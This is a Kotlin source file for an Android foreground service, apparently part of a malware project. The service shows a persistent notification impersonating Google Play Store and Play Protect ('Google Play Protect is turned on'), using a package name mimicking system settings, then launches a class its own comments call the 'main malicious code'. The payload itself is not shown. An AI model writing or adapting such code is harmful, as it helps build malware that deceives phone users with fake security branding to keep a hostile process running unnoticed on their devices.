package org.android.settings

import android.app.*
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.support.v4.app.NotificationCompat

class MainService() : Service() {

    companion object {
        /* Start Service with "MainService.startService()" */
        fun startService(context: Context) {
            context.startForegroundService(Intent(context, MainService::class.java))
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        /* Creates persistent notification that opens
        * Google Play Protect documentation web page
        * on tap */
        val settingsIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://support.google.com/googleplay/answer/2812853?hl=it"))
        val pendingIntent: PendingIntent = PendingIntent.getActivity(this, 0, settingsIntent, PendingIntent.FLAG_IMMUTABLE)

        /* Setup notification channel */
        val channelId = java.util.UUID.randomUUID().toString()
        val channel = NotificationChannel(channelId, "Google Play Services channel", NotificationManager.IMPORTANCE_DEFAULT)

        /* Setup notification information's */
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        val builder = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(R.drawable.ic_notification_protected)
            .setTicker("Google Play Store")
            .setContentTitle("Google Play Store")
            .setContentText("Google Play Protect is turned on")
            .setContentInfo("This feature protects your device from harmful apps")
            .setContentIntent(pendingIntent)

        /* Show notification and start
        * main malicious code */
        val notification = builder.build()
        startForeground(1, notification)
        MainMaliciousCode.start()
        return START_STICKY
    }
}